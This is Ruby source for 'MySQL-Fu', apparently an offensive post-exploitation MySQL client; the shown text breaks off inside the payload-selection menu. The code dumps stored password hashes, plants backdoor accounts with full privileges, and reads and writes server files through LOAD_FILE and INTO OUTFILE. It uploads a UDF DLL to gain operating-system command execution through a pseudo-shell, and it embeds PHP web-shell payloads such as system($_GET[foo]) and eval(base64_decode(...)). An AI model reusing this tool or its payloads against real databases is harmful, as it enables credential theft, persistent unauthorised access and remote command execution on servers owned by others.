# MySQL-Fu Client by Hood3dRob1n
# Simple Hacker Friendly MySQL Client in Ruby
# Direct connect to Database to perform common tasks
# Requires valid credentials of course :p
# NOTE: Requires the 'mysql' gem for connection handling, and 'mysqldump' cli tool for data dumping

class MySQLc
  def initialize(host='127.0.0.1', port=3306, user='root', pass=nil, db=nil)
    @host=host; @port=port; @user=user; @pass=pass; @db=db; @db_connection=nil;
    @hostname=nil; @dbuser=nil; @version=nil; @datadir=nil; @os=nil; @passwords=nil;
    begin
      db_connection = Mysql.connect(host, user, pass, db, port)
      @db_connection=db_connection
    rescue Mysql::Error => e
      print_error("Connection Problem")
      print_error("#{e}")
    end
  end

  # Check and confirm connection
  def connected?
    if @db_connection
      return true
    else
      return false
    end
  end

  # MySQL-FU Client Help Menu
  def mysqlfu_usage
    puts "Available Options for MySQL-Fu Client Menu: ".underline.white
    puts "back ".light_yellow + "        => ".white + "Return to Main Menu".light_red
    puts "basic".light_yellow + "        => ".white + "Basic Info (User, Version, etc)".light_red
    puts "dbs".light_yellow + "          => ".white + "Available Databases".light_red
    puts "tables".light_yellow + "       => ".white + "Tables for Known Database".light_red
    puts "dbtables".light_yellow + "     => ".white + "Tables for All Databases".light_red
    puts "columns".light_yellow + "      => ".white + "Columns for Table from an available DB".light_red
    puts "privs".light_yellow + "        => ".white + "MySQL User Privileges".light_red
    puts "passwords".light_yellow + "    => ".white + "Dump DB Usernames & Passwords (privileged)".light_red
    puts "update".light_yellow + "       => ".white + "UPDATE Column Data for Table from an available DB".light_red
    puts "create_user".light_yellow + "  => ".white + "CREATE New DB User w/Pass (privileged)".light_red
    puts "insert_user".light_yellow + "  => ".white + "INSERT New DB User w/Pass (privileged)".light_red
    puts "delete_user".light_yellow + "  => ".white + "DELETE MySQL DB User (privileged)".light_red
    puts "read".light_yellow + "         => ".white + "Read via LOAD_FILE() (privileged)".light_red
    puts "write".light_yellow + "        => ".white + "Write via INTO OUTFILE (privileged)".light_red
    puts "read_infile".light_yellow + "  => ".white + "Read via LOAD DATA INFILE + TEMP TABLE (privileged)".light_red
    puts "write_infile".light_yellow + " => ".white + "Write via LOAD DATA LOCAL INFILE + TEMP TABLE + INTO OUTFILE (privileged)".light_red
    puts "tdump".light_yellow + "        => ".white + "Dump Table".light_red
    puts "dbdump".light_yellow + "       => ".white + "Dump Database".light_red
    puts "dump_all".light_yellow + "     => ".white + "Dump All".light_red
    puts "kingcope".light_yellow + "     => ".white + "Kingcope's Linux MySQL Privilege Escalation (CVE-2012-5613)".light_red
    puts "sql ".light_yellow + "         => ".white + "Drop to SQL Shell for Custom SQL Queries".light_red
    puts "exit ".light_yellow + "        => ".white + "Exit Completely".light_red
    print_line("")
  end

  # MySQL-FU Client
  def mysqlfu_shell
    puts
    prompt = "(MySQL-Fu)> "
    while line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      case cmd
      when /^!(.+)/
        cmd=$1.strip.chomp
        res = commandz(cmd)
        print_line("\n#{res.join().chomp}")
        mysqlfu_shell
      when /^c$|^clear$|^cls$/i
        cls
        banner
        mysqlfu_shell
      when /^h$|^help$|^ls$/i
        puts
        mysqlfu_usage
        mysqlfu_shell
      when /^exit$|^quit$|^back$/i
        puts
        print_error("Returning to Main Menu....")
        mysqlfu_shell
      when /^local$|^OS$/i
        local_shell
        mysqlfu_shell
      when  /^ip$/i
        ip_info
        mysqlfu_shell
      when /^sql$|^sql.shell/i
        print_line("")
        print_status("Dropping to SQL Shell....")
        print_caution("Type 'QUIT' or 'EXIT' to exit SQL Shell....")
        print_status("...")
        sql_shell
        print_line("")
        mysqlfu_shell
      when /^basic|^info/i
        print_line("")
        get_basics
        mysqlfu_shell
      when /^dbs$|^databases$|^show databases$/i
        print_line("")
        print_good("Available Databases: ")
        get_dbs
        print_line("")
        mysqlfu_shell
      when /^tables$|^show tables$/i
        print_line("")
        db = Readline.readline("(Database)> ", true)
        print_good("Tables for #{db.chomp}: ")
        get_tables(db.chomp)
        print_line("")
        mysqlfu_shell
      when /^dbtables$|^show.all.tables$/i
        print_line("")
        get_all_tables
        print_line("")
        mysqlfu_shell
      when /^columns|^col$/i
        print_line("")
        db = Readline.readline("(Database)> ", true)
        print_good("Available Tables for #{db.chomp}: ")
        get_tables(db.chomp)
        print_line("")
        tbl = Readline.readline("(Table)> ", true)
        get_columns(db.chomp, tbl.chomp)
        print_line("")
        mysqlfu_shell
      when /^privs$|^privileges/i
        print_line("")
        print_good("Current Privileges: ")
        get_current_privs
        print_line("")
        mysqlfu_shell
      when /^pass|^show.pass/i
        print_line("")
        print_status("Attempting to dump MySQL Usernames & Passwords....")
        get_passwords
        print_line("")
        mysqlfu_shell
      when /^update/i
        print_line("")
        db = Readline.readline("(Database)> ", true)
        tbl = Readline.readline("(Table)> ", true)
        num = Readline.readline("(Number of Columns to UPDATE values for)> ", true)
        updates = []
        (1 .. num.chomp.to_i).each do |x|
          colname = Readline.readline("(Provide COLUMN\##{x} to UPDATE)> ", true)
          colvalue = Readline.readline("(Provide NEW COLUMN\##{x} VALUE)> ", true)
          updates << "#{colname.chomp}='#{colvalue.chomp}'"
        end
        print_caution("i.e. user='admin', id='1', gid='25', name=\"Moderator\", etc.")
        condition = Readline.readline("(Provide condition for WHERE clause)> ", true)
        update(db.chomp, tbl.chomp, updates, condition.chomp)
        print_line("")
        mysqlfu_shell
      when /^create.user/i
        print_line("")
        user = Readline.readline("(New Account Username)> ", true)
        pass = Readline.readline("(Password for #{user.chomp})> ", true)
        create_user(user.chomp, pass.chomp)
        print_line("")
        mysqlfu_shell
      when /^insert.user/i
        print_line("")
        user = Readline.readline("(New Account Username)> ", true)
        pass = Readline.readline("(Password for #{user.chomp})> ", true)
        insert_user(user.chomp, pass.chomp)
        print_line("")
        mysqlfu_shell
      when /^delete.user/i
        print_line("")
        delete_user
        print_line("")
        mysqlfu_shell
      when /^read$|^read_file|^read file/i
        print_line("")
        read_file_shell
        print_line("")
        mysqlfu_shell
      when /^read2$|^read.infile/i
        print_line("")
        read_infile_shell
        print_line("")
        mysqlfu_shell
      when /^write$|^write_file|^write file/i
        print_line("")
        file_writer_setup(1)
        print_line("")
        mysqlfu_shell
      when /^write2$|^write.infile/i
        print_line("")
        file_writer_setup(2)
        print_line("")
        mysqlfu_shell
      when /^tdump$|^table.dump|^dump.table/i
        print_line("")
        db = Readline.readline("(Database)> ", true)
        tbl = Readline.readline("(Table to Dump)> ", true)
        answer = Readline.readline("(GZIP Compress DUMP File (Y/N)?)> ", true)
        if answer.chomp.upcase == 'Y' or answer.chomp.upcase == 'YES'
          dump_table(db.chomp, tbl.chomp, 1)
        else
          dump_table(db.chomp, tbl.chomp, 2)
        end
        print_line("")
        mysqlfu_shell
      when /^dbdump$|^db.dump|^dump.db|^database.dump/i
        print_line("")
        db = Readline.readline("(Database)> ", true)
        answer = Readline.readline("(GZIP Compress DUMP File (Y/N)?)> ", true)
        if answer.chomp.upcase == 'Y' or answer.chomp.upcase == 'YES'
          dump_database(db.chomp, 1)
        else
          dump_database(db.chomp, 2)
        end
        print_line("")
        mysqlfu_shell
      when /^dump.all$|^dump.everything|^dump.databases$/i
        print_line("")
        answer = Readline.readline("(GZIP Compress DUMP File (Y/N)?)> ", true)
        if answer.chomp.upcase == 'Y' or answer.chomp.upcase == 'YES'
          dump_all_databases(1)
        else
          dump_all_databases(2)
        end
        print_line("")
        mysqlfu_shell
      when /^kingcope|^kingc$|^kcope$/i
        print_line("")
        kingcope_escalation
        print_line("")
        mysqlfu_shell
      else
        cls
        print_line("")
        print_error("Oops, Didn't quite understand that one")
        print_error("Please Choose a Valid Option From Menu Below Next Time.....")
        print_line("")
        mysqlfu_usage
        mysqlfu_shell
      end
    end
  end

  # Basic Environmental Info
  def get_basics
    foo='#'*25
    query = @db_connection.query('SELECT @@hostname;') if @hostname.nil?
    query.each { |x| @hostname = x[0] } if @hostname.nil?
    query = @db_connection.query('SELECT user();') if @dbuser.nil?
    query.each { |x| @dbuser = x[0] } if @dbuser.nil?
    query = @db_connection.query('SELECT version();') if @version.nil?
    query.each { |x| @version = x[0] } if @version.nil?
    query = @db_connection.query('SELECT @@datadir;') if @datadir.nil?
    query.each { |x| @datadir = x[0] } if @datadir.nil?
    query = @db_connection.query('SELECT @@version_compile_os;') if @os.nil?
    query.each { |x| @os = x[0] } if @os.nil?
    print_status("#{foo}")
    print_good("Host: #{@host}:#{@port}")
    print_good("User: #{@user}")
    print_good("Pass: #{@pass}")
    print_good("Hostname: #{@hostname}") unless @hostname.nil?
    print_good("Version:  #{@version}") unless @version.nil?
    print_good("DB User:  #{@dbuser}") unless @dbuser.nil?
    print_good("Datadir:  #{@datadir}") unless @datadir.nil?
    print_good("Sys OS:   #{@os}") unless @os.nil?
    print_status("#{foo}")
    print_line("")
  end

  # Confirm Windows OS
  # Return true or false
  def is_windows?(dbc)
    begin
      q = dbc.query('SELECT @@version_compile_os;')
      q.each { |x| @os = x[0] }
      if @os =~ /Win|\.NET/i
        if @os =~ /Win64|WOW64/i
          @build='x64'
        else
          @build='x32'
        end
        return true
      else
        return false
      end
    rescue Mysql::Error => e
      print_error("Problem confirming target is Windows!")
      puts "\t=> ".white + "#{e}".light_red
      return false
    end
  end

  # Find Drive & Path in Use
  def get_drive
    begin
      q = @db_connection.query('SELECT @@tmpdir;')
      q.each { |x| @tmp=x[0]; }
      return @tmp[0]
    rescue Mysql::Error => e
      print_error("Problem getting drive from @@tmpdir!")
      puts "\t=> ".white + "#{e}".light_red
      return nil
    end
  end

  # Determine Plugin Directory
  # This is where we need to write UDF to
  # Returns plugin directory path or nil
  def get_plugin_dir
    begin
      q = @db_connection.query('SELECT @@plugin_dir;')
      q.each { |x| @pdir=x[0]; }
      if @pdir.nil?
        q = @db_connection.query("SHOW VARIABLES LIKE 'basedir';")
        q.each { |x| @pdir=x[1]; }
        plugpath = @pdir.split("\\").join("\\\\")
        plugpath += "\\\\lib\\\\plugin\\\\"
      else
        plugpath = @pdir.split("\\").join("\\\\")
        plugpath += "\\\\"
      end
      return plugpath
    rescue Mysql::Error => e
      print_error("Problem determining the plugins directory!")
      puts "\t=> ".white + "#{e}".light_red
      return nil
    end
  end

  # Check if the UDF SYS_EXEC() function already exists
  # Return true or false
  def sys_exec_check
    begin
      q = @db_connection.query("SELECT COUNT(*) FROM mysql.func WHERE name='sys_exec';")
      q.each do |x|
        if x[0].to_i == 0
          return false
        else
          return true
        end
      end
    rescue Mysql::Error => e
      print_error("Problem Checking for SYS_EXEC() function!")
      puts "\t=> ".white + "#{e}".light_red
      return false
    end
  end

  # Check if the UDF SYS_EVAL() function already exists
  # Return true or false
  def sys_eval_check
    begin
      q = @db_connection.query("SELECT COUNT(*) FROM mysql.func WHERE name='sys_eval';")
      q.each do |x|
        if x[0].to_i == 0
          return false
        else
          return true
        end
      end
    rescue Mysql::Error => e
      print_error("Problem Checking for SYS_EVAL() function!")
      puts "\t=> ".white + "#{e}".light_red
      return false
    end
  end

  # Add UDF Package & Create Function
  # SYS_EXEC() & SYS_EVAL() Created (allows CMD Exec)
  # Pass in architexture type: 1=x32, 2=x64
  def create_sys_functions
    udf_name = randz(15) + ".dll"
    plugin_path = get_plugin_dir
    udf_dest = plugin_path.chomp + udf_name
    if @build == 'x64'
      file = "#{HOME}extras/myudf/payloads/64/lib_mysqludf_sys.dll"
    elsif @build == 'x32'
      file = "#{HOME}extras/myudf/payloads/32/lib_mysqludf_sys.dll"
    end

    # Upload our UDF DLL Payload file
    if udf_write_bin_file(file, udf_dest)
      begin
        # Drop function if its already there, then create new
        q = @db_connection.query("DROP FUNCTION IF EXISTS sys_exec;")
        q = @db_connection.query("CREATE FUNCTION sys_exec RETURNS int SONAME '#{udf_name}';")
        q = @db_connection.query("CREATE FUNCTION sys_eval RETURNS string SONAME '#{udf_name}';")

        # Confirm it was added and all is well....
        if sys_exec_check
          return udf_dest
        else
          return nil
        end
      rescue Mysql::Error => e
        print_error("Problem creating UDF SYS functions!")
        puts "\t=> ".white + "#{e}\n\n".light_red
        return nil
      end
    end
  end

  # Run Command via SYS_EXEC()
  # No output from commands
  # True on success or false otherwise
  def sys_exec_cmd(cmd)
    begin
      q = @db_connection.query("SELECT sys_exec('#{cmd}');")
      q.each do |x|
        if x[0].to_i == 0
          return true
        else
          return false
        end
      end
    rescue Mysql::Error => e
      print_error("Problem Executing Command!")
      puts "\t=> ".white + "#{e}".light_red
      return false
    end
  end

  # Run Command via SYS_EXEC()
  def sys_eval_cmd(cmd)
    begin
      q = @db_connection.query("SELECT sys_eval('#{cmd}');")
      q.each { |x| @res = x[0] }
      return @res
    rescue Mysql::Error => e
      print_error("Problem Executing Command!")
      puts "\t=> ".white + "#{e}".light_red
      return nil
    end
  end

  # Write Local Binary to File via INTO DUMPFILE
  def udf_write_bin_file(file, dll_dest)
    data = "0x" + File.open(file, 'rb').read.unpack('H*').first
    begin
      @db_connection.query("SELECT #{data} INTO DUMPFILE '#{dll_dest}';")
      print_good("Appears things were a success!")
      return true
    rescue Mysql::Error => e
      print_error("Problem writing payload to file!")
      puts "\t=> ".white + "#{e}".light_red
      if e =~ /MySQL server has gone away/
        print_error("This is likely due to payload which is too large in size.....")
        print_error("Try compressing with UPX to shrink size down".light_red + ": upx 9 -qq #{file}")
        puts "\t=> ".white + "Then try again".light_red + ".....".white
      end
      return false
    end
  end

  # Write MOF to File via INTO DUMPFILE
  def write_mof_file(bin, dest)
    payload = bin.unpack("H*")[0]
    begin
      @db_connection.query("SELECT 0x#{payload} INTO DUMPFILE '#{dest}'")
      print_good("Appears things were a success!")
      return true
    rescue Mysql::Error => e
      print_error("Problem writing payload to file!")
      puts "\t=> ".white + "#{e}".light_red
      return false
    end
  end

  # Write Local Binary to File via INTO DUMPFILE
  def mof_write_bin_file(file, exe_dest)
    data = "0x" + File.open(file, 'rb').read.unpack('H*').first
    begin
      @db_connection.query("SELECT #{data} INTO DUMPFILE '#{exe_dest}'")
      print_good("Appears things were a success!")
      return true
    rescue Mysql::Error => e
      print_error("Problem writing payload to file!")
      puts "\t=> ".white + "#{e}".light_red
      if e =~ /MySQL server has gone away/
        print_error("This is likely due to payload which is too large in size.....")
        print_error("Try compressing with UPX to shrink size down: upx 9 -qq #{file}")
        puts "\t=> ".white + "Then try again".light_red + ".....".white
      end
      return false
    end
  end

  # Pseduo Shell Session
  # Run consecutive commands
  def udf_sys_shell
    if sys_eval_check
      prompt = "(CMD)> "
      while line = Readline.readline("#{prompt}", true)
        cmd = line.chomp
        case cmd
        when /^exit$|^quit$/i
          puts "\n\n"
          print_error("OK, exiting UDF Pseudo Shell.....\n")
          break
        else
          res = sys_eval_cmd(cmd)
          puts
          if res.nil? or res == 'NULL'
            print_error("NULL or No results returned....")
          else
            puts "#{res}\n".white
          end
        end
      end
    else
      print_error("Can't continue without confirmed SYS_EVAL() function!\n")
    end
  end

  # Get Available Databases
  def get_dbs
    query = @db_connection.query('SHOW DATABASES;')
    query.each { |x| print_line("#{x[0]}") }
  end

  # Get Tables for passed Database
  def get_tables(db)
    if db == @db
      query = @db_connection.query('SHOW TABLES;')
      query.each { |x| puts "#{x[0]}".white }
    else
      @db_connection.close if @db_connection
      begin
        db_connection = Mysql.connect(@host, @user, @pass, db, @port.to_i)
        query = db_connection.query('SHOW TABLES;')
        query.each { |x| puts "#{x[0]}".white }
        db_connection.close if db_connection
      rescue Mysql::Error => e
        print_error("Problem getting tables from #{db}!")
        print_error("#{e}")
      end
      @db_connection = Mysql.connect(@host, @user, @pass, @db, @port.to_i)
    end
  end

  # Get Tables for each available DB
  def get_all_tables
    query = @db_connection.query('SHOW DATABASES;')
    @db_connection.close if @db_connection
    query.each do |x|
      begin
        db_connection = Mysql.connect(@host, @user, @pass, x[0], @port.to_i)
        print_good("Tables for #{x[0]}")
        query = db_connection.query('SHOW TABLES;')
        query.each { |y| print_line("#{y[0]}") }
        puts
        db_connection.close if db_connection
      rescue Mysql::Error => e
        print_error("Problem getting tables from #{x[0]}!")
        print_error("#{e}")
      end
    end
    @db_connection = Mysql.connect(@host, @user, @pass, @db, @port.to_i)
  end

  # Get Columns for known Table in known DB
  def get_columns(db, tbl)
    @db_connection.close if @db_connection
    begin
      db_connection = Mysql.connect(@host, @user, @pass, db, @port.to_i)
      query = db_connection.query("SHOW COLUMNS FROM #{tbl};")
      print_good("Columns for #{db}.#{tbl}:")
      query.each { |x, y| print_line("#{x}") }
      db_connection.close
    rescue Mysql::Error => e
      print_error("Problem getting Columns from #{db}.#{tbl}!")
      print_error("#{e}")
    end
    @db_connection = Mysql.connect(@host, @user, @pass, @db, @port.to_i)
  end

  # Get Privleges for Current User
  def get_current_privs
    query = @db_connection.query("SHOW GRANTS FOR current_user();")
    query.each { |x| print_line("#{x[0]}") }
  end

  # Dump MySQL Usernames & Passwords
  def get_passwords
    count=0
    zcount=0
    begin
      columns=[ 'user', 'host', 'password', 'super_priv', 'file_priv', 'insert_priv', 'update_priv', 'Create_user_priv', 'create_priv', 'drop_priv', 'grant_priv' ]
      titlerow = []
      columns.each { |col| titlerow << col.sub('_priv', '') }
      data=[] # Array of Arrays for table later
      data << titlerow
      query = @db_connection.query("SELECT COUNT(#{columns[0]}) FROM mysql.user;")
      query.each { |x| zcount = x[0].to_i }
      while count.to_i < zcount.to_i
        row_data = []
        columns.each do |col|
          query = @db_connection.query("SELECT #{col} FROM mysql.user limit #{count},1;")
          query.each { |x| row_data << x[0] }
        end
        data << row_data unless row_data.empty?
        count = count.to_i + 1
      end
      if data.size == 1
        print_error("Unable to dump any passwords from mysql.user!")
        print_error("Lack of privileges? IDK....")
        print_line("")
        return false
      else	
        print_good("MySQL Users & Passwords:")
        pad = (data[0].size * 3) + data[0].size
        strsize = data[0].join().to_s.size
        breaker="\#" * (pad + strsize)
        print_good("#{breaker}")
        table = data.to_table(:first_row_is_head => true)
        @passwords=table.to_s
        print_line("#{@passwords}")
        print_good("#{breaker}")
        return true
      end
    rescue Mysql::Error => e
      print_error("Problem Dumping MySQL Usernames & Passwords!")
      print_error("#{e}")
      return false
    end
  end

  # Make an UPDATE to existing Data
  # UPDATE table_name SET field1=new-value1, field2=new-value2 [WHERE Clause]
  def update(db, tbl, updates, condition)
    # Build our SQL Query with info provided
    count=updates.size
    prep = "UPDATE #{tbl} SET "
    updates.each do |columnset|
      if count.to_i == 1
        prep += "#{columnset} "
      else
        prep += "#{columnset}, "
      end
      count = count.to_i - 1 
    end
    prep += "WHERE #{condition};"

    # User Confirmation & Execution of Update Query
    @db_connection.close if @db_connection
    begin
      db_connection = Mysql.connect(@host, @user, @pass, db, @port.to_i)
      query = db_connection.query("SELECT * FROM #{tbl} WHERE #{condition};")
      print_caution("Before Update: ")
      query.each { |x| print_line("#{x[0]}") }
      print_line("")

      print_caution("Please confirm this UPDATE statement looks correct before we execute: ")
      print_caution("#{prep}")
      answer = Readline.readline("(Does this look good (Y/N)?)> ", true)
      if "#{answer.chomp.upcase}" == "YES" or "#{answer.chomp.upcase}" == "Y"
        print_status("OK, sending UPDATE request...")
        query = db_connection.query("#{prep}")
        print_status("After Update: ")
        query = db_connection.query("SELECT * FROM #{tbl} WHERE #{condition};")
        query.each { |x| print_line("#{x[0]}") }
        db_connection.close
        print_line("")
        print_status("Hope things worked, if not you can try custom SQL option from the Main Menu")
      else
        print_error("OK, aborting Update request.....")
      end
      print_status("Returning to Main Menu....")
    rescue Mysql::Error => e
      print_error("Problem with Update for #{db}.#{tbl}!")
      print_error("#{e}")
    end
    @db_connection = Mysql.connect(@host, @user, @pass, @db, @port.to_i)
  end

  # CREATE New MySQL User Account
  def create_user(user, pass)
    print_status("Attempting New User Creation for '#{user}' with password '#{pass}'.....")
    begin
      print_caution("Before Update: ")
      get_passwords
      query = @db_connection.query("CREATE USER '#{user}'@'%' IDENTIFIED BY '#{pass}';")
      print_status("Account Created, running GRANT to extend full privileges to new user account...")
      query = @db_connection.query("GRANT ALL PRIVILEGES ON *.* TO '#{user}'@'%' IDENTIFIED BY '#{pass}' WITH GRANT OPTION;")
      query = @db_connection.query('FLUSH PRIVILEGES;')
      print_status("After Update: ")
      get_passwords
      print_line("")
      print_status("Try logging in with new account credentials to confirm success...")
      print_caution("If issues found, its likely do to GRANT not being allowed remotely!")
      print_caution("Try INSERT method if this is the case to try and override....")
    rescue Mysql::Error => e
      print_error("Problem with New User Creation!")
      print_error("#{e}")
    end
  end

  # INSERT New MySQL User Account (Forceful addition)
  def insert_user(user, pass)
    print_status("Attempting New User Insertion for '#{user}' with password '#{pass}'.....")
    begin
      print_caution("Before Update: ")
      get_passwords
      # Insert to mysql.user where shit is stored
      query = @db_connection.query("INSERT INTO mysql.user (Host,User,Password,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Reload_priv,Shutdown_priv,Process_priv,File_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Show_db_priv,Super_priv,Create_tmp_table_priv,Lock_tables_priv,Execute_priv,Repl_slave_priv,Repl_client_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Create_user_priv,ssl_type,ssl_cipher,x509_issuer,x509_subject,max_questions,max_updates,max_connections,max_user_connections) VALUES('%','#{user}',PASSWORD('#{pass}'),'Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');")
      # Insert into mysql.db for GRANT overrides....working?
      query = @db_connection.query("INSERT INTO mysql.db (Host,Db,User,Select_priv,Insert_priv,Update_priv,Delete_priv,Create_priv,Drop_priv,Grant_priv,References_priv,Index_priv,Alter_priv,Create_tmp_table_priv,Lock_tables_priv,Create_view_priv,Show_view_priv,Create_routine_priv,Alter_routine_priv,Execute_priv)  VALUES('%','test','#{user}','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y','Y');")
      query = @db_connection.query('FLUSH PRIVILEGES;')
      print_status("After Update: ")
      get_passwords
      print_line("")
      print_status("Try logging in with new account credentials to confirm success...")
      print_caution("If issues found, its likely do to GRANT Insertion not working properly!")
      print_caution("Try CREATE method if this is the case....")
    rescue Mysql::Error => e
      print_error("Problem with New User Insertion!")
      print_error("#{e}")
    end
  end

  # Delete MySQL User via DROP
  def delete_user
    print_status("Current MySQL Users & Host Info: ")
    query = @db.query('SELECT group_concat(0x0a,host,0x3a,user) FROM mysql.user;')
    query.each { |x| puts "#{x[0]}".white }
    print_line("")
    user = Readline.readline("(Username to DROP)> ", true)
    host = Readline.readline("(Host Entry for #{user.chomp} to DROP)> ", true)
    answer = Readline.readline("(Confirm: DROP #{user.chomp}@#{host.chomp} (Y/N))> ", true)
    if "#{answer.chomp.upcase}" == "YES" or "#{answer.chomp.upcase}" == "Y"
      print_status("OK, sending DROP request.....")
      begin
        query = @db_connection.query('USE mysql;')
        query = @db_connection.query("DROP USER '#{user.chomp}'@'#{host.chomp}';")
        query = @db_connection.query('FLUSH PRIVILEGES;')
      rescue Mysql::Error => e
        print_error("Problem with DROP!")
        print_error("#{e}")
      end
      print_status("Updated MySQL Users & Host Info: ")
      query = @db.query('SELECT group_concat(0x0a,host,0x3a,user) FROM mysql.user;')
      query.each { |x| print_line("#{x[0]}") }
      print_line("")
    else
      print_error("OK, aborting User DROP and Returning to Main Menu...")
    end
  end

  # Pseudo Shell to Read Files via LOAD_FILE()
  def read_file_shell
    while(true)
      prompt = "(FileReader)> "
      line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      if cmd =~ /^exit|^quit/i
        print_line("")
        print_error("OK, closing File Reader shell...")
        print_error("Returning to Main Menu...")
        break
      else
        begin
          print_line("")
          query = @db_connection.query("SELECT LOAD_FILE(#{cmd.mysqlhex})")
          res=''
          query.each { |x| res += x[0] }
          print_line("#{res}")
          print_line("")

          # Log Success for offline review
          logs = RESULTS + @host
          logdir = logs + '/files/'
          logfile = logdir + cmd.gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
          Dir.mkdir(logs) unless File.exists?(logs)
          Dir.mkdir(logdir) unless File.exists?(logdir)
          f=File.open(logfile, 'w+')
          f.puts res
          f.close
        rescue
          print_line("")
          print_error("Oops, an error was encountered trying to read #{cmd}!")
          print_error("Error Code: #{@db_connection.errno}")
          print_error("Error Message: #{@db_connection.error}")
          print_line("")
        end
      end
    end
  end

  # Pseudo Shell to Read Files via LOAD DATA INFILE + TEMP TABLE
  def read_infile_shell
    while(true)
      prompt = "(FileReader2)> "
      line = Readline.readline("#{prompt}", true)
      cmd = line.chomp
      if cmd =~ /^exit|^quit/i
        print_line("")
        print_error("OK, closing File Reader shell...")
        print_error("Returning to Main Menu...")
        break
      else
        begin
          print_line("")
          foodb=randz(15)
          fooread=randz(10)
          # Read target file into temp table on temp database we create
          query = @db_connection.query('DROP DATABASE IF EXISTS #{foodb};')
          query = @db_connection.query('CREATE DATABASE #{foodb};')
          query = @db_connection.query('USE #{foodb};')
          query = @db_connection.query("CREATE TEMPORARY TABLE #{fooread} (content LONGTEXT);")
          query = @db_connection.query("LOAD DATA INFILE '#{cmd}' INTO TABLE #{fooread};")

          # Now read file content from table
          query = @db_connection.query("SELECT * FROM #{fooread};")
          res=[]
          query.each { |x| res << x[0] }
          print_line("#{res.join("\n")}")
          print_line("")

          # Now Cleanup our Temp Table & Temp DB
          query = @db_connection.query('DROP TEMPORARY TABLE #{fooread};')
          query = @db_connection.query('DROP DATABASE #{foodb};')

          # Log Success for offline review
          logs = RESULTS + @host
          logdir = logs + '/files/'
          logfile = logdir + cmd.gsub('/', '_').gsub('\\', '_').gsub(/[;:'",.~`!@#$\%^&*\(\)=\[\]]/, '_')
          Dir.mkdir(logs) unless File.exists?(logs)
          Dir.mkdir(logdir) unless File.exists?(logdir)
          f=File.open(logfile, 'w+')
          f.puts res.join("\n")
          f.close
        rescue
          print_line("")
          print_error("Oops, an error was encountered trying to read #{cmd}!")
          print_error("Error Code: #{@db_connection.errno}")
          print_error("Error Message: #{@db_connection.error}")
          print_line("")
        end
      end
    end
  end

  # Write File via SQL INTO OUTFILE
  def file_write(remote_path, payload, payload_filename)
    writable = remote_path + payload_filename
    begin
      print_status("Writing payload to #{writable}....")
      query = @db_connection.query("SELECT #{payload} INTO OUTFILE '#{writable}';")
      print_good("OK, should be all set if you didn't get any errors!")
    rescue Mysql::Error => e
      print_error("Problem writing file!")
      print_error("#{e}")
    end
  end

  # Write File via MySQL's LOAD DATA LOCAL INFILE + INTO OUTFILE
  def file_write2(localfile, remote_path, payload_filename)
    foodb=randz(15)
    fooread=randz(10)
    writable = remote_path + payload_filename
    begin
      print_status("Attempting to Write File to Target.....")
      # Read local file into temp table on temp database we create
      query = @db_connection.query('CREATE DATABASE #{foodb};')
      query = @db_connection.query('USE #{foodb};')
      query = @db_connection.query("CREATE TEMPORARY TABLE #{fooread} (content LONGTEXT);")
      query = @db_connection.query("LOAD DATA LOCAL INFILE '#{localfile}' INTO TABLE #{foodb}.#{fooread};")

      # Confirm Local File was read into temp table
      print_status("Checking Local Payload File was read into temp database....")
      query = @db_connection.query("SELECT * FROM #{foodb}.#{fooread};")
      query.each { |x| print_line("#{x[0]}") }

      # Now actually write to file
      print_status("Writing payload to #{writable}...")
      query = @db_connection.query("SELECT * FROM #{foodb}.#{fooread} INTO OUTFILE '#{writable}';")

      # Cleanup temp table and temp db we created
      print_status("All done, cleaning up tables....")
      query = @db_connection.query('DROP TEMPORARY TABLE #{foodb}.#{fooread};')
      query = @db_connection.query('DROP DATABASE #{foodb};')

      print_good("OK, should be all set if you didn't get any errors!")
    rescue Mysql::Error => e
      print_error("Problem writing file!")
      print_error("#{e}")
      query = @db_connection.query('DROP TEMPORARY TABLE #{foodb}.#{fooread};')
      query = @db_connection.query('DROP DATABASE #{foodb};')
    end
  end

  # Base Setup for File Writer actions
  # Call with NUM=1 for file_write(), NUM=2 for file_write2()
  def file_writer_setup(num)
    reverse=false
    simple=false
    if num.to_1 != 1
      while(true)
        lfile = Readline.readline("(Path to Local File)> ", true)
        if File.exists?(lfile.strip.chomp)
          localfile=lfile.strip.chomp
          payload_filename=lfile.strip.chomp.split('/')[-1]
          break
        else
          print_error("Can't find or read provided file!")
          print_error("Check path or permissions and try again...")
          print_line("")
        end
      end
      rpath = Readline.readline("(Remote Writable Path)>", true)
      remote_path = rpath.chomp
      file_write2(localfile, remote_path, payload_filename)
    else
      while(true)
        print_caution("Select Payload Option: ")
        print_caution("1) Local File")
        print_caution("2) PHP CMD Shell")
        print_caution("3) PHP Reverse Shell")
        answer=gets.chomp
        print_line("")
        if answer.to_i > 0 and answer.to_i <= 3
          case answer.to_i
          when 1
            while(true)
              print_caution("Path to Local File: ")
              answer=gets.strip.chomp
              print_line("")
              if File.exists?(answer)
                payload=File.open(answer).read
                payload_filename=answer.split('/')[-1]
                break
              else
                print_error("Can't find or read provided file!")
                print_error("Check path or permissions and try again...")
                print_line("")
              end
            end
          when 2
            while(true)
              print_caution("Select PHP Shell Option: ")
              print_caution("1) Simple System($_GET['foo']) Shell")
              print_caution("2) Simple Eval(Base64($_REQUEST['foo'])) Shell")
              print_caution("3) Simple Passthru(Base64($_SERVER[HTTP_FOO])) Shell")
              print_caution("4) Simple Create_function(Base64($_SERVER[HTTP_FOO])) Shell")
              answer=gets.chomp
              print_line("")
              if answer.to_i > 0 and answer.to_i <= 4
                simple=true
                case answer.to_i
                when 1	
                  simple_connect=1
                  payload="<?error_reporting(0);print(___);system($_GET[foo]);print(___);die;?>"
                when 2
                  simple_connect=2
                  payload="<?error_reporting(0);print(___);eval(base64_decode($_REQUEST[foo]));print(___);die;?>"
                when 3
                  simple_connect=3
